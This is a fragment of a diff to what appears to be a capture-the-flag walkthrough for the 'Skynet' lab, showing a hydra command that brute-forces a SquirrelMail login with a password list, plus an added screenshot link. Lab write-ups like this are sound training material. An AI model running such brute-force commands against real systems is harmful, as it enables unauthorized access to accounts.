@@ -127,3 +127,4 @@ smb: \logs\> q
 ```
 hydra -l milesdyson -P /home/w3awer/skynet/pass.txt 10.129.145.218 http-post-form "/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^:F=Unknown user or password incorrect."
 ```
+<img width="687" height="206" alt="Снимок экрана 2026-05-04 в 07 39 38" src="https://github.com/user-attachments/assets/019ddead-304c-4693-af7d-27ae3460f676" />
